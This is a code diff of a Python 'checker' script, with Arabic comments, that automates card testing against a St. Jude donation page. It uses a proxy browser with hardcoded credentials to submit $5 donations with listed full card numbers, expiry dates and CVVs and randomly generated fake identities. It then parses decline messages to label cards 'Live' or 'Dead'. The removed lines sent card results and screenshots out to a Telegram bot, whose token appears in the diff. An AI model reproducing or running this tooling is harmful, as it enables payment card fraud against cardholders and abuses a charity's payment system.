@@ -1,15 +1,13 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-St. Jude Checker — Playwright + BrightData Scraping Browser
+St. Jude Checker — v15 (Fast + Mass)
 """
 
 import re
 import os
 import time
-import json
 import random
-import requests
 from playwright.sync_api import sync_playwright
 
 
@@ -17,10 +15,13 @@ from playwright.sync_api import sync_playwright
 # CONFIG
 # ═══════════════════════════════════════════════════════════
 
-TEST_CARD = "5104040287872188|12|2027|951"
-
-BOT_TOKEN = "8647240736:AAEGXuwmtZkUvAfbURX2BcyyuoWD-TekP_0"
-CHAT_ID = "6843321125"
+CARDS = [
+    "5143772873843560|02|30|945",
+    "4147202548364411|06|27|288",
+    "4828210009461358|10|29|840",
+    "5488093703717434|11|2028|076",
+    "5555422029770025|08|2030|805",
+]
 
 BD_USER = "brd-customer-hl_24c8058e-zone-scraping_browser1"
 BD_PASS = "eyr0v46j28pi"
@@ -40,43 +41,8 @@ ADDRESSES = [
 
 
 # ═══════════════════════════════════════════════════════════
-# TELEGRAM
+# HELPERS
 # ═══════════════════════════════════════════════════════════
-
-def send_telegram_photo(photo_path, caption=""):
-    try:
-        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
-        with open(photo_path, 'rb') as f:
-            files = {'photo': f}
-            data = {'chat_id': CHAT_ID, 'caption': caption[:1024]}
-            r = requests.post(url, files=files, data=data, timeout=30)
-            return r.status_code == 200
-    except:
-        return False
-
-
-def send_telegram_message(text):
-    try:
-        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-        data = {'chat_id': CHAT_ID, 'text': text[:4000], 'parse_mode': 'HTML'}
-        r = requests.post(url, data=data, timeout=30)
-        return r.status_code == 200
-    except:
-        return False
-
-
-def screenshot(page, name):
-    try:
-        os.makedirs("/app/screenshots", exist_ok=True)
-        path = f"/app/screenshots/{int(time.time())}_{name}.png"
-        page.screenshot(path=path, full_page=False)
-        print(f"📸 {name}", flush=True)
-        send_telegram_photo(path, caption=f"📸 {name}")
-        return path
-    except Exception as e:
-        print(f"Screenshot err: {str(e)[:80]}", flush=True)
-        return None
-
 
 def make_email(f, l):
     return f"{f.lower()}{l.lower()}{random.randint(100,999)}@gmail.com"
@@ -86,7 +52,7 @@ def make_email(f, l):
 # MAIN CHECK
 # ═══════════════════════════════════════════════════════════
 
-def check_card(card):
+def check_card(browser, card, idx, total):
     t0 = time.time()
     result = "UNKNOWN"
     
@@ -99,200 +65,212 @@ def check_card(card):
         if len(yy) == 2:
             yy = "20" + yy
         
-        send_telegram_message(f"🔍 <b>فحص بدأ</b>\n💳 <code>{num[:6]}****{num[-4:]}</code>")
+        print(f"\n{'='*60}", flush=True)
+        print(f"🔍 [{idx}/{total}] {num[:6]}****{num[-4:]}", flush=True)
+        print(f"{'='*60}", flush=True)
         
-        print("=" * 60, flush=True)
-        print("🌐 Connecting to BrightData Scraping Browser...", flush=True)
+        # ═══ جلسة جديدة لكل كارت ═══
+        context = browser.new_context()
+        page = context.new_page()
         
-        with sync_playwright() as p:
-            # ═══ اتصال BrightData CDP ═══
-            cdp_url = f"wss://{BD_USER}:{BD_PASS}@{BD_HOST}:{BD_PORT}"
-            
-            browser = p.chromium.connect_over_cdp(cdp_url, timeout=120000)
-            
-            print("✅ Connected to BrightData", flush=True)
-            
-            # جلسة جديدة
-            context = browser.new_context() if not browser.contexts else browser.contexts[0]
-            page = context.new_page()
-            
-            # ═══ افتح الصفحة ═══
-            print("📄 Loading page...", flush=True)
-            page.goto(DONATE_URL, timeout=90000, wait_until="domcontentloaded")
-            
-            print("✅ Page loaded", flush=True)
-            time.sleep(5)
-            
-            screenshot(page, "01_page_loaded")
-            
-            # ═══ زر Other Payment Options ═══
+        # ═══ فتح الصفحة ═══
+        print("📄 Loading...", flush=True)
+        page.goto(DONATE_URL, timeout=60000, wait_until="domcontentloaded")
+        time.sleep(3)
+        
+        # ═══ Other Payment Options ═══
+        try:
+            page.wait_for_selector("#continue-to-other-payment", timeout=20000, state="visible")
+            page.click("#continue-to-other-payment")
+            print("👆 Other Payment", flush=True)
+            time.sleep(2)
+        except:
+            pass
+        
+        # ═══ Credit Card ═══
+        try:
+            page.wait_for_selector("#cc-link", timeout=20000, state="visible")
+            page.click("#cc-link")
+            print("👆 Credit Card", flush=True)
+            time.sleep(2)
+        except:
+            pass
+        
+        # ═══ انتظار الفورم ═══
+        try:
+            page.wait_for_selector("#cardNumber", timeout=20000, state="visible")
+            print("✅ Form ready", flush=True)
+        except:
+            context.close()
+            return ("NO_FORM", round(time.time() - t0, 1))
+        
+        # ═══ ملء البيانات ═══
+        f = random.choice(FIRST_NAMES)
+        l = random.choice(LAST_NAMES)
+        em = make_email(f, l)
+        ad = random.choice(ADDRESSES)
+        ph = f"{random.randint(200,999)}{random.randint(200,999)}{random.randint(1000,9999)}"
+        
+        print("📝 Filling...", flush=True)
+        
+        # Card
+        page.fill("#cardNumber", num)
+        page.fill("#expMonth", mm)
+        page.fill("#expYear", yy[2:] if len(yy) == 4 else yy)
+        page.fill("#cardCvv2", cvv)
+        
+        # Amount
+        try:
+            page.fill("#donationAmountOther", "5")
+        except:
+            pass
+        
+        # Personal
+        page.fill("#firstName", f)
+        page.fill("#lastName", l)
+        page.fill("#email", em)
+        page.fill("#address1", ad["a1"])
+        page.fill("#city", ad["c"])
+        
+        try:
+            page.select_option("#stateProvince", ad["s"])
+        except:
+            pass
+        
+        page.fill("#zipPostalCode", ad["z"])
+        
+        try:
+            page.fill("#phoneNumber", ph)
+        except:
+            pass
+        
+        print("✅ Form filled", flush=True)
+        time.sleep(0.3)
+        
+        # ═══ Click Donate ═══
+        print("👆 Donate...", flush=True)
+        try:
+            page.click("#donateButton")
+        except:
+            pass
+        
+        # ═══ انتظر الرد ═══
+        print("⏳ Waiting response...", flush=True)
+        
+        response = None
+        for i in range(25):
+            time.sleep(1)
             try:
-                page.wait_for_selector("#continue-to-other-payment", timeout=30000, state="visible")
-                page.click("#continue-to-other-payment")
-                print("👆 Other Payment Options", flush=True)
-                time.sleep(3)
-                screenshot(page, "02_other_payment")
-            except Exception as e:
-                print(f"⚠️ No other payment: {str(e)[:80]}", flush=True)
-            
-            # ═══ زر Credit Card ═══
-            try:
-                page.wait_for_selector("#cc-link", timeout=30000, state="visible")
-                page.click("#cc-link")
-                print("👆 Credit Card", flush=True)
-                time.sleep(3)
-                screenshot(page, "03_cc_clicked")
-            except Exception as e:
-                print(f"⚠️ No cc link: {str(e)[:80]}", flush=True)
-            
-            # ═══ انتظار الفورم ═══
-            try:
-                page.wait_for_selector("#cardNumber", timeout=30000, state="visible")
-                print("✅ Form ready", flush=True)
-            except Exception as e:
-                print(f"❌ No form: {str(e)[:80]}", flush=True)
-                screenshot(page, "ERR_no_form")
-                return ("NO_FORM", round(time.time() - t0, 1))
-            
-            # ═══ ملء البيانات ═══
-            f = random.choice(FIRST_NAMES)
-            l = random.choice(LAST_NAMES)
-            em = make_email(f, l)
-            ad = random.choice(ADDRESSES)
-            ph = f"{random.randint(200,999)}{random.randint(200,999)}{random.randint(1000,9999)}"
-            
-            print("📝 Filling form...", flush=True)
-            
-            # Card
-            page.fill("#cardNumber", num)
-            time.sleep(0.1)
-            page.fill("#expMonth", mm)
-            time.sleep(0.05)
-            page.fill("#expYear", yy[2:] if len(yy) == 4 else yy)
-            time.sleep(0.05)
-            page.fill("#cardCvv2", cvv)
-            time.sleep(0.1)
-            
-            # Amount
-            try:
-                page.fill("#donationAmountOther", "5")
-            except:
-                pass
-            
-            # Personal
-            page.fill("#firstName", f)
-            time.sleep(0.05)
-            page.fill("#lastName", l)
-            time.sleep(0.05)
-            page.fill("#email", em)
-            time.sleep(0.1)
-            page.fill("#address1", ad["a1"])
-            time.sleep(0.1)
-            page.fill("#city", ad["c"])
-            time.sleep(0.1)
-            
-            try:
-                page.select_option("#stateProvince", ad["s"])
-            except:
-                pass
-            
-            page.fill("#zipPostalCode", ad["z"])
-            time.sleep(0.1)
-            
-            try:
-                page.fill("#phoneNumber", ph)
-            except:
-                pass
-            
-            print(f"✅ Form filled", flush=True)
-            time.sleep(0.5)
-            screenshot(page, "04_form_filled")
-            
-            # ═══ Click Donate ═══
-            print("👆 Clicking Donate...", flush=True)
-            try:
-                page.click("#donateButton")
-                print("✅ Donate clicked", flush=True)
-            except Exception as e:
-                print(f"❌ Donate error: {str(e)[:80]}", flush=True)
-            
-            time.sleep(3)
-            screenshot(page, "05_after_click")
-            
-            # ═══ انتظر الرد ═══
-            print("⏳ Waiting for response...", flush=True)
-            
-            response = None
-            for i in range(30):
-                time.sleep(1)
-                try:
-                    page_text = page.inner_text("body")
-                    text_lower = page_text.lower()
-                    
-                    patterns = [
-                        r"there are insufficient funds[^.]*\.",
-                        r"insufficient funds[^.]*\.",
-                        r"your card was declined[^.]*\.",
-                        r"card was declined[^.]*\.",
-                        r"card has expired[^.]*\.",
-                        r"security code is invalid[^.]*\.",
-                        r"card number is invalid[^.]*\.",
-                        r"do not honor[^.]*\.",
-                        r"restricted card[^.]*\.",
-                        r"suspected fraud[^.]*\.",
-                        r"thank you for your donation[^.]*\.",
-                        r"your donation was successful[^.]*\.",
-                        r"we are sorry[^.]*\.",
-                    ]
-                    
-                    for pat in patterns:
-                        m = re.search(pat, text_lower)
-                        if m:
-                            response = m.group(0).strip()
-                            break
-                    
-                    if response:
+                page_text = page.inner_text("body")
+                text_lower = page_text.lower()
+                
+                patterns = [
+                    r"there are insufficient funds[^.]*\.",
+                    r"insufficient funds[^.]*\.",
+                    r"your card was declined[^.]*\.",
+                    r"card was declined[^.]*\.",
+                    r"card has expired[^.]*\.",
+                    r"security code is invalid[^.]*\.",
+                    r"card number is invalid[^.]*\.",
+                    r"do not honor[^.]*\.",
+                    r"restricted card[^.]*\.",
+                    r"suspected fraud[^.]*\.",
+                    r"thank you for your donation[^.]*\.",
+                    r"your donation was successful[^.]*\.",
+                    r"we are sorry[^.]*\.",
+                ]
+                
+                for pat in patterns:
+                    m = re.search(pat, text_lower)
+                    if m:
+                        response = m.group(0).strip()
                         break
-                except:
-                    pass
-            
-            screenshot(page, "06_response")
-            
-            if response:
-                result = response[:300]
-            else:
-                result = "NO_RESPONSE"
-            
-            page.close()
-            browser.close()
+                
+                if response:
+                    break
+            except:
+                pass
+        
+        context.close()
+        
+        if response:
+            result = response[:200]
+        else:
+            result = "NO_RESPONSE"
     
     except Exception as e:
-        result = f"ERR: {str(e)[:150]}"
-        print(f"❌ Error: {str(e)[:200]}", flush=True)
+        result = f"ERR: {str(e)[:100]}"
+        print(f"❌ {str(e)[:150]}", flush=True)
     
     elapsed = round(time.time() - t0, 1)
     
-    print("\n" + "=" * 60, flush=True)
-    print(f"💳 {card}", flush=True)
     print(f"📝 {result}", flush=True)
     print(f"⏱️ {elapsed}s", flush=True)
-    print("=" * 60, flush=True)
-    
-    send_telegram_message(
-        f"📊 <b>النتيجة</b>\n"
-        f"💳 <code>{card}</code>\n"
-        f"📝 <code>{result}</code>\n"
-        f"⏱️ {elapsed}s"
-    )
     
     return (result, elapsed)
 
 
-if __name__ == "__main__":
+# ═══════════════════════════════════════════════════════════
+# MAIN
+# ═══════════════════════════════════════════════════════════
+
+def main():
     print("=" * 60, flush=True)
-    print("  St. Jude — Playwright + BrightData", flush=True)
+    print("  St. Jude — v15 (Fast + Mass)", flush=True)
     print("=" * 60, flush=True)
-    print(f"💳 {TEST_CARD}", flush=True)
+    print(f"📁 Cards: {len(CARDS)}", flush=True)
     print("=" * 60, flush=True)
     
-    check_card(TEST_CARD)
+    results = []
+    t_start = time.time()
+    
+    with sync_playwright() as p:
+        # ═══ اتصال BrightData مرة واحدة ═══
+        cdp_url = f"wss://{BD_USER}:{BD_PASS}@{BD_HOST}:{BD_PORT}"
+        
+        print("🌐 Connecting to BrightData...", flush=True)
+        browser = p.chromium.connect_over_cdp(cdp_url, timeout=120000)
+        print("✅ Connected", flush=True)
+        
+        # ═══ فحص كل كارت ═══
+        for idx, card in enumerate(CARDS, 1):
+            result, elapsed = check_card(browser, card, idx, len(CARDS))
+            results.append({
+                'card': card,
+                'result': result,
+                'elapsed': elapsed,
+            })
+        
+        browser.close()
+    
+    total_time = round(time.time() - t_start, 1)
+    
+    # ═══ النتائج النهائية ═══
+    print("\n" + "=" * 60, flush=True)
+    print("📊 FINAL RESULTS", flush=True)
+    print("=" * 60, flush=True)
+    
+    for r in results:
+        print(f"💳 {r['card']}", flush=True)
+        print(f"   📝 {r['result']}", flush=True)
+        print(f"   ⏱️ {r['elapsed']}s", flush=True)
+        print("-" * 60, flush=True)
+    
+    print(f"\n⏱️ Total: {total_time}s ({round(total_time/60, 1)} min)", flush=True)
+    print("=" * 60, flush=True)
+    
+    # ═══ ملخص ═══
+    live = sum(1 for r in results if 'insufficient' in r['result'].lower() or 'declined' in r['result'].lower())
+    dead = len(results) - live
+    
+    print(f"\n✅ Live: {live}", flush=True)
+    print(f"❌ Dead: {dead}", flush=True)
+
+
+if __name__ == "__main__":
+    try:
+        main()
+    except KeyboardInterrupt:
+        print("\n🛑 Stopped", flush=True)
+    except Exception as e:
+        print(f"\n❌ Error: {str(e)[:200]}", flush=True)
